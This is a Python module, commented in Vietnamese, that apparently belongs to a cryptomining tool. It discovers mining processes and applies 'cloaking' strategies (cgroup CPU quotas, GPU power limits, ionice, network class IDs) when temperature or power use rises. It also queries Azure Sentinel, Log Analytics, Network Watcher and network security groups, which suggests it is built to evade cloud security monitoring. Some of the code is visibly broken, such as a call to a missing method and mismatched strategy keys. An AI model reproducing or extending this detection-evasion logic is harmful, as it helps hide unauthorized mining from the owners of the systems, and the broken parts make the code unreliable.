# resource_manager.py

import os
import logging
import psutil
import pynvml
import traceback
import subprocess
from time import sleep
from typing import List, Any, Dict, Optional, Tuple
from queue import PriorityQueue, Empty, Queue
from threading import Event, Lock
from concurrent.futures import ThreadPoolExecutor
from itertools import count

from readerwriterlock import rwlock

# Import các module phụ trợ từ dự án
from .base_manager import BaseManager
from .utils import MiningProcess, GPUManager
from .cloak_strategies import CloakStrategy, CloakStrategyFactory
from .cgroup_manager import CgroupManager  # Import CgroupManager

# CHỈ GIỮ LẠI các import từ azure_clients TRỪ AzureTrafficAnalyticsClient
from .azure_clients import (
    AzureSentinelClient,
    AzureLogAnalyticsClient,
    AzureNetworkWatcherClient,
    # AzureTrafficAnalyticsClient đã được loại bỏ
    AzureAnomalyDetectorClient
    # AzureOpenAIClient đã được loại bỏ
)

from .auxiliary_modules import temperature_monitor
from .auxiliary_modules.power_management import (
    PowerManager,
    get_cpu_power,
    get_gpu_power,
    set_gpu_usage,
    shutdown_power_management
)


class SharedResourceManager:
    """
    Lớp cung cấp các hàm điều chỉnh tài nguyên (CPU, RAM, GPU, Disk, Network...).
    """
    def __init__(self, config: Dict[str, Any], logger: logging.Logger, cgroup_manager: CgroupManager):
        self.config = config
        self.logger = logger
        self.cgroup_manager = cgroup_manager
        self.original_resource_limits = {}
        self.gpu_manager = GPUManager()
        self.power_manager = PowerManager()

    def is_gpu_initialized(self) -> bool:
        """
        Kiểm tra xem GPU đã được khởi tạo hay chưa.
        """
        self.logger.debug(
            f"Checking GPU initialization: {self.gpu_manager.gpu_initialized}"
        )
        return self.gpu_manager.gpu_initialized

    def shutdown_nvml(self):
        """
        Đóng NVML khi không cần thiết.
        """
        self.gpu_manager.shutdown_nvml()  # Sử dụng GPUManager để shutdown NVML

    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess, cgroups: Dict[str, str]):
        """
        Áp dụng một chiến lược cloaking cho tiến trình đã cho.

        Args:
            strategy_name (str): Tên của chiến lược cloaking (ví dụ: 'cpu', 'gpu').
            process (MiningProcess): Đối tượng tiến trình khai thác.
            cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller.
        """
        try:
            pid = process.pid
            name = process.name

            # Lưu trữ giới hạn tài nguyên ban đầu nếu chưa được lưu
            if pid not in self.original_resource_limits:
                self.original_resource_limits[pid] = {}

                if strategy_name == 'cpu':
                    current_quota = self.cgroup_manager.get_cgroup_parameter(
                        cgroups['cpu'], 'cpu.cfs_quota_us', 'cpu'
                    )
                    current_threads = self.cgroup_manager.get_cgroup_parameter(
                        cgroups['cpu'], 'cpuset.cpus', 'cpuset'
                    )
                    self.original_resource_limits[pid]['cpu_cloak'] = {
                        'cgroup': cgroups['cpu'],
                        'cpu_quota_us': current_quota,
                        'cpu_threads': current_threads
                    }

                elif strategy_name == 'ram':
                    current_ram = self.cgroup_manager.get_cgroup_parameter(
                        cgroups['ram'], 'memory.limit_in_bytes', 'memory'
                    )
                    self.original_resource_limits[pid]['ram_cloak'] = {
                        'ram_allocation_mb': int(current_ram) // (1024 * 1024)
                    }

                elif strategy_name == 'gpu':
                    current_power = self.gpu_manager.get_gpu_power_limit(pid)
                    self.original_resource_limits[pid]['gpu_cloak'] = {
                        'gpu_power_limit': current_power
                    }

                elif strategy_name == 'ionice':
                    # Giả sử có phương thức để lấy ionice class hiện tại
                    current_ionice = self.get_current_ionice_class(pid)
                    self.original_resource_limits[pid]['ionice_cloak'] = {
                        'ionice_class': current_ionice
                    }

                elif strategy_name == 'network':
                    current_bandwidth = self.cgroup_manager.get_cgroup_parameter(
                        cgroups['network'], 'net_cls.classid', 'net_cls'
                    )
                    self.original_resource_limits[pid]['network_cloak'] = {
                        'network_bandwidth_limit_mbps': float(current_bandwidth)
                    }

                elif strategy_name == 'cache':
                    current_cache_limit = self.cgroup_manager.get_cgroup_parameter(
                        cgroups['cache'], 'cache.max', 'cache'
                    )
                    self.original_resource_limits[pid]['cache_cloak'] = {
                        'cache_limit_percent': float(current_cache_limit)
                    }

            self.logger.debug(f"Tạo strategy '{strategy_name}' cho {name} (PID={pid})")
            strategy = CloakStrategyFactory.create_strategy(
                strategy_name,
                self.config,
                self.logger,
                self.cgroup_manager,          
                self.is_gpu_initialized()    
            )

            if not strategy:
                self.logger.error(f"Failed to create strategy '{strategy_name}'. Strategy is None.")
                return
            if not callable(getattr(strategy, 'apply', None)):
                self.logger.error(f"Invalid strategy: {strategy.__class__.__name__} does not implement a callable 'apply' method.")
                return

            self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid})")
            strategy.apply(process, cgroups)  # Các điều chỉnh tài nguyên được thực hiện trực tiếp bởi strategy
            self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")

        except Exception as e:
            self.logger.error(
                f"Lỗi không xác định khi áp dụng cloaking '{strategy_name}' cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore_resources(self, process: MiningProcess):
        """
        Khôi phục lại các tài nguyên ban đầu cho tiến trình đã cho bằng cách sử dụng các chiến lược cloaking để khôi phục các giới hạn tài nguyên.

        Args:
            process (MiningProcess): Đối tượng tiến trình khai thác.
        """
        try:
            pid = process.pid
            name = process.name
            orig_limits = self.original_resource_limits.get(pid)
            if not orig_limits:
                self.logger.warning(
                    f"Không thấy original_limits cho {name} (PID={pid})."
                )
                return

            # Khôi phục các giới hạn tài nguyên từ original_resource_limits
            for strategy_name, limits in orig_limits.items():
                if strategy_name.endswith('_cloak'):
                    strategy_key = strategy_name.split('_')[0]  # 'cpu', 'ram', etc.
                    strategy = CloakStrategyFactory.create_strategy(
                        strategy_key,
                        self.config,
                        self.logger,
                        self.cgroup_manager,          
                        self.is_gpu_initialized()    
                    )
                    if strategy and callable(getattr(strategy, 'restore', None)):
                        self.logger.info(f"Khôi phục chiến lược '{strategy_key}' cho {name} (PID: {pid})")
                        strategy.restore(process, limits)
                    else:
                        self.logger.error(f"Không thể khôi phục chiến lược '{strategy_key}' cho {name} (PID: {pid})")
            
            # Xóa trạng thái ban đầu
            del self.original_resource_limits[pid]
            self.logger.info(
                f"Khôi phục xong tài nguyên cho {name} (PID={pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Lỗi restore_resources cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise


class ResourceManager(BaseManager):
    """
    Lớp quản lý tài nguyên hệ thống, chịu trách nhiệm giám sát và điều chỉnh tài nguyên cho các tiến trình khai thác.
    Đây là một Singleton để đảm bảo chỉ có một instance của ResourceManager tồn tại.
    """
    _instance = None
    _instance_lock = Lock()

    def __new__(cls, *args, **kwargs):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super().__new__(cls)
        return cls._instance

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        super().__init__(config, logger)
        if getattr(self, '_initialized', False):
            return
        self._initialized = True

        self.config = config
        self.logger = logger

        self.stop_event = Event()
        self.resource_lock = rwlock.RWLockFair()
        self.cloaking_request_queue = Queue()
        self.resource_adjustment_queue = PriorityQueue()
        self.processed_tasks = set()

        self.mining_processes = []
        self.mining_processes_lock = rwlock.RWLockFair()
        self._counter = count()

        # Khởi tạo các client Azure (đã bỏ AzureSecurityCenterClient và AzureTrafficAnalyticsClient)
        self.initialize_azure_clients()
        self.discover_azure_resources()

        # Khởi tạo CgroupManager
        self.cgroup_manager = CgroupManager(logger)

        # Khởi tạo SharedResourceManager
        self.shared_resource_manager = SharedResourceManager(config, logger, self.cgroup_manager)

        # Sử dụng ThreadPoolExecutor để quản lý các thread
        self.executor = ThreadPoolExecutor(max_workers=5)
        self.initialize_tasks()

    def initialize_tasks(self):
        """
        Khởi tạo các tác vụ bằng ThreadPoolExecutor.
        """
        # Submit các thread vào executor
        self.monitor_future = self.executor.submit(self.monitor_and_adjust)
        self.cloaking_future = self.executor.submit(self.process_cloaking_requests)
        self.adjustment_future = self.executor.submit(self.process_resource_adjustments)

    def start(self):
        """
        Bắt đầu ResourceManager, bao gồm việc khám phá tiến trình khai thác và khởi động các thread.
        """
        self.logger.info("Bắt đầu ResourceManager...")
        self.discover_mining_processes()
        self.logger.info("ResourceManager đã khởi động xong.")

    def stop(self):
        """
        Dừng ResourceManager, bao gồm việc dừng các thread và tắt power management.
        """
        self.logger.info("Dừng ResourceManager...")
        self.stop_event.set()
        self.executor.shutdown(wait=True)
        self.shared_resource_manager.shutdown_nvml()
        self.shutdown_power_management()  # Gọi hàm shutdown_power_management
        self.cgroup_manager.delete_cgroup('priority_cpu', controllers='cpu')  # Xóa cgroup priority_cpu nếu tồn tại
        self.logger.info("ResourceManager đã dừng.")

    def initialize_azure_clients(self):
        """
        Khởi tạo các client Azure cần thiết.
        """
        self.azure_sentinel_client = AzureSentinelClient(self.logger)
        self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
        self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
        self.azure_anomaly_detector_client = AzureAnomalyDetectorClient(self.logger, self.config)
        # ĐÃ BỎ self.azure_openai_client
        # self.azure_openai_client = AzureOpenAIClient(self.logger, self.config)

    def discover_azure_resources(self):
        """
        Khám phá các tài nguyên Azure cần thiết.
        """
        try:
            self.network_watchers = self.azure_network_watcher_client.discover_resources(
                'Microsoft.Network/networkWatchers'
            )
            self.logger.info(f"Khám phá {len(self.network_watchers)} Network Watchers.")

            self.nsgs = self.azure_network_watcher_client.discover_resources(
                'Microsoft.Network/networkSecurityGroups'
            )
            self.logger.info(f"Khám phá {len(self.nsgs)} NSGs.")

            # Đã loại bỏ việc khám phá Traffic Analytics Workspaces
            # self.traffic_analytics_workspaces = self.azure_traffic_analytics_client.get_traffic_workspace_ids()
            # self.logger.info(
            #     f"Khám phá {len(self.traffic_analytics_workspaces)} Traffic Analytics Workspaces."
            # )
            self.logger.info("Khám phá Traffic Analytics Workspaces đã bị loại bỏ.")

        except Exception as e:
            self.logger.error(f"Lỗi khám phá Azure: {e}\n{traceback.format_exc()}")

    def acquire_write_lock(self, lock: rwlock.RWLockFairWriteLock, timeout: Optional[float] = None) -> bool:
        """
        Tiện ích để chiếm write lock với timeout.

        Args:
            lock (rwlock.RWLockFairWriteLock): Write lock cần chiếm.
            timeout (Optional[float], optional): Thời gian chờ (giây). Defaults to None.

        Returns:
            bool: True nếu chiếm thành công, False nếu timeout.
        """
        try:
            acquired = lock.acquire(timeout=timeout)
            if acquired:
                self.logger.debug("Acquired write lock successfully.")
            else:
                self.logger.warning("Failed to acquire write lock: timeout.")
            return acquired
        except Exception as e:
            self.logger.error(f"Lỗi khi acquire_write_lock: {e}\n{traceback.format_exc()}")
            return False

    def acquire_read_lock(self, lock: rwlock.RWLockFairReadLock, timeout: Optional[float] = None) -> bool:
        """
        Tiện ích để chiếm read lock với timeout.

        Args:
            lock (rwlock.RWLockFairReadLock): Read lock cần chiếm.
            timeout (Optional[float], optional): Thời gian chờ (giây). Defaults to None.

        Returns:
            bool: True nếu chiếm thành công, False nếu timeout.
        """
        try:
            acquired = lock.acquire(timeout=timeout)
            if acquired:
                self.logger.debug("Acquired read lock successfully.")
            else:
                self.logger.warning("Failed to acquire read lock: timeout.")
            return acquired
        except Exception as e:
            self.logger.error(f"Lỗi khi acquire_read_lock: {e}\n{traceback.format_exc()}")
            return False

    def discover_mining_processes(self):
        """
        Khám phá các tiến trình khai thác đang chạy trên hệ thống dựa trên cấu hình.
        """
        try:
            cpu_name = self.config['processes'].get('CPU', '').lower()
            gpu_name = self.config['processes'].get('GPU', '').lower()

            write_lock = self.mining_processes_lock.gen_wlock()
            acquired = write_lock.acquire(timeout=5)
            if not acquired:
                self.logger.error("Timeout khi acquire mining_processes_lock trong discover_mining_processes.")
                return

            try:
                self.mining_processes.clear()
                for proc in psutil.process_iter(['pid', 'name']):
                    pname = proc.info['name'].lower()
                    if cpu_name in pname or gpu_name in pname:
                        prio = self.get_process_priority(proc.info['name'])
                        net_if = self.config.get('network_interface', 'eth0')
                        mining_proc = MiningProcess(
                            proc.info['pid'], proc.info['name'], prio, net_if, self.logger
                        )
                        self.mining_processes.append(mining_proc)
                self.logger.info(
                    f"Khám phá {len(self.mining_processes)} tiến trình khai thác."
                )
            finally:
                write_lock.release()
        except Exception as e:
            self.logger.error(f"Lỗi discover_mining_processes: {e}\n{traceback.format_exc()}")

    def get_process_priority(self, process_name: str) -> int:
        """
        Lấy độ ưu tiên của tiến trình dựa trên tên.

        Args:
            process_name (str): Tên của tiến trình.

        Returns:
            int: Độ ưu tiên của tiến trình.
        """
        priority_map = self.config.get('process_priority_map', {})
        pri_val = priority_map.get(process_name.lower(), 1)
        if isinstance(pri_val, dict) or not isinstance(pri_val, int):
            self.logger.warning(
                f"Priority cho tiến trình '{process_name}' không phải int => gán 1."
            )
            return 1
        return pri_val

    def monitor_and_adjust(self):
        """
        Thread để giám sát và điều chỉnh tài nguyên dựa trên các thông số như nhiệt độ và công suất.
        """
        mon_params = self.config.get("monitoring_parameters", {})
        temp_intv = mon_params.get("temperature_monitoring_interval_seconds", 60)
        power_intv = mon_params.get("power_monitoring_interval_seconds", 60)

        while not self.stop_event.is_set():
            try:
                # 1) Cập nhật danh sách mining_processes
                self.discover_mining_processes()

                # 2) Phân bổ tài nguyên theo thứ tự ưu tiên
                self.allocate_resources_with_priority()

                # 3) Kiểm tra nhiệt độ CPU/GPU, nếu vượt ngưỡng thì enqueue cloak
                temp_lims = self.config.get("temperature_limits", {})
                cpu_max_temp = temp_lims.get("cpu_max_celsius", 75)
                gpu_max_temp = temp_lims.get("gpu_max_celsius", 85)

                for proc in self.mining_processes:
                    self.check_temperature_and_enqueue(proc, cpu_max_temp, gpu_max_temp)

                # 4) Kiểm tra công suất CPU/GPU, nếu vượt ngưỡng thì enqueue cloak
                power_limits = self.config.get("power_limits", {})
                per_dev_power = power_limits.get("per_device_power_watts", {})

                cpu_max_pwr = per_dev_power.get("cpu", 150)
                if not isinstance(cpu_max_pwr, (int, float)):
                    self.logger.warning(f"cpu_max_power invalid: {cpu_max_pwr}, default=150")
                    cpu_max_pwr = 150

                gpu_max_pwr = per_dev_power.get("gpu", 300)
                if not isinstance(gpu_max_pwr, (int, float)):
                    self.logger.warning(f"gpu_max_power invalid: {gpu_max_pwr}, default=300")
                    gpu_max_pwr = 300

                for proc in self.mining_processes:
                    self.check_power_and_enqueue(proc, cpu_max_pwr, gpu_max_pwr)

                # 5) Thu thập metrics (nếu vẫn cần để giám sát)
                metrics_data = self.collect_all_metrics()

                # Loại bỏ các phần liên quan đến OpenAI

            except Exception as e:
                self.logger.error(f"Lỗi monitor_and_adjust: {e}\n{traceback.format_exc()}")

            # 6) Nghỉ theo chu kỳ lớn nhất (mặc định 60 giây)
            sleep(max(temp_intv, power_intv))

    def check_temperature_and_enqueue(self, process: MiningProcess, cpu_max_temp: int, gpu_max_temp: int):
        """
        Kiểm tra nhiệt độ CPU và GPU của tiến trình và enqueue các điều chỉnh nếu cần.

        Args:
            process (MiningProcess): Đối tượng tiến trình khai thác.
            cpu_max_temp (int): Ngưỡng nhiệt độ CPU tối đa (°C).
            gpu_max_temp (int): Ngưỡng nhiệt độ GPU tối đa (°C).
        """
        try:
            cpu_temp = temperature_monitor.get_cpu_temperature(process.pid)
            gpu_temp = temperature_monitor.get_gpu_temperature(process.pid)

            adjustments = {}
            if cpu_temp is not None and cpu_temp > cpu_max_temp:
                self.logger.warning(
                    f"Nhiệt độ CPU {cpu_temp}°C > {cpu_max_temp}°C (PID={process.pid})."
                )
                adjustments['cpu_cloak'] = True
            if gpu_temp is not None and gpu_temp > gpu_max_temp:
                self.logger.warning(
                    f"Nhiệt độ GPU {gpu_temp}°C > {gpu_max_temp}°C (PID={process.pid})."
                )
                adjustments['gpu_cloak'] = True

            if adjustments:
                task = {
                    'type': 'monitoring',
                    'process': process,
                    'adjustments': adjustments
                }
                priority = 2
                count_val = next(self._counter)
                self.resource_adjustment_queue.put((priority, count_val, task))
        except Exception as e:
            self.logger.error(f"check_temperature_and_enqueue error: {e}\n{traceback.format_exc()}")

    def check_power_and_enqueue(self, process: MiningProcess, cpu_max_power: int, gpu_max_power: int):
        """
        Kiểm tra công suất CPU và GPU của tiến trình và enqueue các điều chỉnh nếu cần.

        Args:
            process (MiningProcess): Đối tượng tiến trình khai thác.
            cpu_max_power (int): Ngưỡng công suất CPU tối đa (W).
            gpu_max_power (int): Ngưỡng công suất GPU tối đa (W).
        """
        try:
            c_power = get_cpu_power(process.pid)
            g_power = get_gpu_power(process.pid) if self.shared_resource_manager.is_gpu_initialized() else 0.0

            adjustments = {}
            if c_power > cpu_max_power:
                self.logger.warning(
                    f"CPU power={c_power}W > {cpu_max_power}W (PID={process.pid})."
                )
                adjustments['cpu_cloak'] = True

            # Kiểm tra nếu g_power là list
            if isinstance(g_power, list):
                total_g_power = sum(g_power)
                self.logger.debug(f"Total GPU power for PID={process.pid}: {total_g_power}W")
                if total_g_power > gpu_max_power:
                    self.logger.warning(
                        f"Tổng GPU power={total_g_power}W > {gpu_max_power}W (PID={process.pid})."
                    )
                    adjustments['gpu_cloak'] = True
            else:
                if g_power > gpu_max_power:
                    self.logger.warning(
                        f"GPU power={g_power}W > {gpu_max_power}W (PID={process.pid})."
                    )
                    adjustments['gpu_cloak'] = True

            if adjustments:
                task = {
                    'type': 'monitoring',
                    'process': process,
                    'adjustments': adjustments
                }
                priority = 2
                count_val = next(self._counter)
                self.resource_adjustment_queue.put((priority, count_val, task))
        except Exception as e:
            self.logger.error(f"check_power_and_enqueue error: {e}\n{traceback.format_exc()}")

    def allocate_resources_with_priority(self):
        """
        Phân bổ tài nguyên cho các tiến trình khai thác theo thứ tự ưu tiên.
        """
        try:
            # Acquire write lock với timeout
            write_lock = self.resource_lock.gen_wlock()
            acquired = write_lock.acquire(timeout=5)
            if not acquired:
                self.logger.error("Timeout khi acquire resource_lock trong allocate_resources_with_priority.")
                return

            try:
                # Acquire read lock với timeout
                read_lock = self.mining_processes_lock.gen_rlock()
                acquired_read = read_lock.acquire(timeout=5)
                if not acquired_read:
                    self.logger.error("Timeout khi acquire mining_processes_lock trong allocate_resources_with_priority.")
                    return

                try:
                    # Sắp xếp các tiến trình theo độ ưu tiên giảm dần
                    sorted_procs = sorted(
                        self.mining_processes,
                        key=lambda x: x.priority,
                        reverse=True
                    )
                    
                    total_cores = psutil.cpu_count(logical=True)
                    allocated = 0
                    
                    for proc in sorted_procs:
                        if allocated >= total_cores:
                            self.logger.warning(
                                f"Không còn CPU core cho {proc.name} (PID: {proc.pid})."
                            )
                            continue
                        
                        # Giới hạn CPU sử dụng bằng cgroup
                        cpu_limit_ratio = min(proc.priority, total_cores - allocated) / total_cores
                        quota = int(cpu_limit_ratio * 100000)
                        self.logger.debug(f"Setting CPU limit for PID={proc.pid}: {cpu_limit_ratio*100:.2f}% ({quota}us)")

                        # Sử dụng CgroupManager để tạo và thiết lập cgroup CPU
                        cpu_cgroup = f"cpu_cloak_{proc.pid}"
                        self.cgroup_manager.create_cgroup(cpu_cgroup, controllers='cpu')
                        self.cgroup_manager.set_cgroup_parameter(
                            cpu_cgroup, 'cpu.cfs_quota_us', str(quota), controllers='cpu'
                        )
                        self.cgroup_manager.assign_process_to_cgroup(proc.pid, cpu_cgroup, controllers='cpu')
                        
                        # Enqueue cloaking strategy
                        task = {
                            'type': 'cloaking',
                            'process': proc,
                            'strategies': ['cpu']
                        }
                        self.resource_adjustment_queue.put((
                            3, 
                            next(self._counter),
                            task
                        ))
                        
                        allocated += proc.priority
                finally:
                    read_lock.release()
            finally:
                write_lock.release()
        except Exception as e:
            self.logger.error(
                f"Lỗi allocate_resources_with_priority: {e}\n{traceback.format_exc()}"
            )

    def process_cloaking_requests(self):
        """
        Thread để xử lý các yêu cầu cloaking từ queue.
        """
        while not self.stop_event.is_set():
            try:
                process = self.cloaking_request_queue.get(timeout=1)
                adjustment_task = {
                    'type': 'cloaking',
                    'process': process,
                    'strategies': ['cpu', 'gpu', 'network', 'disk_io', 'cache']
                }
                priority = 1  # Yêu cầu cloaking có ưu tiên cao nhất
                count_val = next(self._counter)
                self.resource_adjustment_queue.put((priority, count_val, adjustment_task))
                # Không gọi task_done() ở đây
            except Empty:
                pass
            except Exception as e:
                self.logger.error(
                    f"Lỗi trong quá trình xử lý yêu cầu cloaking: {e}"
                )

    def process_resource_adjustments(self):
        """
        Thread để xử lý các điều chỉnh tài nguyên từ resource_adjustment_queue.
        """
        while not self.stop_event.is_set():
            try:
                priority, count_val, task = self.resource_adjustment_queue.get(timeout=1)
                if task['type'] == 'monitoring':
                    self.apply_monitoring_adjustments(task['adjustments'], task['process'])
                elif task['type'] == 'cloaking':
                    for strategy in task['strategies']:
                        self.shared_resource_manager.apply_cloak_strategy(strategy, task['process'], self.config.get('cgroups', {}))
                self.resource_adjustment_queue.task_done()
            except Empty:
                pass
            except Exception as e:
                self.logger.error(f"Lỗi trong process_resource_adjustments: {e}\n{traceback.format_exc()}")

    def apply_monitoring_adjustments(self, adjustments: Dict[str, Any], process: MiningProcess):
        """
        Áp dụng các điều chỉnh dựa trên các thông số giám sát (nhiệt độ, công suất).

        Args:
            adjustments (Dict[str, Any]): Dictionary chứa các điều chỉnh cần áp dụng.
            process (MiningProcess): Đối tượng tiến trình khai thác.
        """
        try:
            if adjustments.get('cpu_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('cpu', process, self.config.get('cgroups', {}))
            if adjustments.get('gpu_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('gpu', process, self.config.get('cgroups', {}))
            if adjustments.get('network_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('network', process, self.config.get('cgroups', {}))
            if adjustments.get('disk_io_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('disk_io', process, self.config.get('cgroups', {}))
            if adjustments.get('cache_cloak'):
                self.shared_resource_manager.apply_cloak_strategy('cache', process, self.config.get('cgroups', {}))
            # Loại bỏ việc gọi throttle_cpu_based_on_load

            self.logger.info(
                f"Áp dụng điều chỉnh monitor cho {process.name} (PID: {process.pid})."
            )
        except Exception as e:
            self.logger.error(f"apply_monitoring_adjustments error: {e}\n{traceback.format_exc()}")

    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        """
        Thu thập các metrics cho một tiến trình cụ thể.

        Args:
            process (MiningProcess): Đối tượng tiến trình khai thác.

        Returns:
            Dict[str, Any]: Dictionary chứa các metrics của tiến trình.
        """
        try:
            p_obj = psutil.Process(process.pid)
            cpu_pct = p_obj.cpu_percent(interval=1)
            mem_mb = p_obj.memory_info().rss / (1024**2)
            gpu_pct = temperature_monitor.get_gpu_temperature(process.pid) if self.shared_resource_manager.is_gpu_initialized() else 0.0
            disk_mbps = temperature_monitor.get_current_disk_io_limit(process.pid)
            net_bw = float(self.config.get('resource_allocation', {})
                                    .get('network', {})
                                    .get('bandwidth_limit_mbps', 100.0))  # Đảm bảo là float
            
            # Lấy metrics cache thông qua SharedResourceManager
            cache_l = self.shared_resource_manager.get_process_cache_usage(process.pid) if hasattr(self.shared_resource_manager, 'get_process_cache_usage') else 0.0

            metrics = {
                'cpu_usage_percent': float(cpu_pct),
                'memory_usage_mb': float(mem_mb),
                'gpu_usage_percent': float(gpu_pct),
                'disk_io_mbps': float(disk_mbps),
                'network_bandwidth_mbps': net_bw,
                'cache_limit_percent': float(cache_l)
            }

            # Kiểm tra từng giá trị metrics để đảm bảo tính hợp lệ
            invalid_metrics = [k for k, v in metrics.items() if not isinstance(v, (int, float))]
            if invalid_metrics:
                self.logger.error(
                    f"Metrics cho PID={process.pid} chứa giá trị không hợp lệ: {invalid_metrics}. Dữ liệu: {metrics}"
                )
                return {}  # Bỏ qua PID này

            self.logger.debug(f"Metrics for PID {process.pid}: {metrics}")
            return metrics
        except Exception as e:
            self.logger.error(
                f"Lỗi collect_metrics cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            return {}

    def collect_all_metrics(self) -> Dict[str, Any]:
        """
        Thu thập toàn bộ metrics cho tất cả các tiến trình khai thác.
        Trả về một dictionary với key là PID và value là các metrics.

        Returns:
            Dict[str, Any]: Dictionary chứa các metrics của tất cả các tiến trình.
        """
        metrics_data = {}
        try:
            read_lock = self.mining_processes_lock.gen_rlock()
            acquired_read = read_lock.acquire(timeout=5)
            if not acquired_read:
                self.logger.error("Timeout khi acquire mining_processes_lock trong collect_all_metrics.")
                return metrics_data

            try:
                for proc in self.mining_processes:
                    metrics = self.collect_metrics(proc)
                    if not isinstance(metrics, dict):
                        self.logger.error(
                            f"Metrics cho PID={proc.pid} không phải là dict. Dữ liệu nhận được: {metrics}"
                        )
                        continue  # Bỏ qua PID này
                    # Kiểm tra từng giá trị trong metrics
                    invalid_metrics = [k for k, v in metrics.items() if not isinstance(v, (int, float))]
                    if invalid_metrics:
                        self.logger.error(
                            f"Metrics cho PID={proc.pid} chứa giá trị không hợp lệ: {invalid_metrics}. Dữ liệu: {metrics}"
                        )
                        continue  # Bỏ qua PID này
                    metrics_data[str(proc.pid)] = metrics
                self.logger.debug(f"Collected metrics data: {metrics_data}")
            finally:
                read_lock.release()
        except Exception as e:
            self.logger.error(f"Lỗi collect_all_metrics: {e}\n{traceback.format_exc()}")
        return metrics_data

    def shutdown(self):
        """
        Dừng ResourceManager, bao gồm việc dừng các thread và tắt power management.
        """
        self.logger.info("Dừng ResourceManager...")
        self.stop_event.set()
        self.executor.shutdown(wait=True)
        self.shared_resource_manager.shutdown_nvml()  # Sử dụng GPUManager để shutdown NVML
        self.shutdown_power_management()  # Gọi hàm shutdown_power_management
        # Xóa các cgroup đã tạo nếu cần
        self.cgroup_manager.delete_cgroup('priority_cpu', controllers='cpu')
        self.logger.info("ResourceManager đã dừng.")
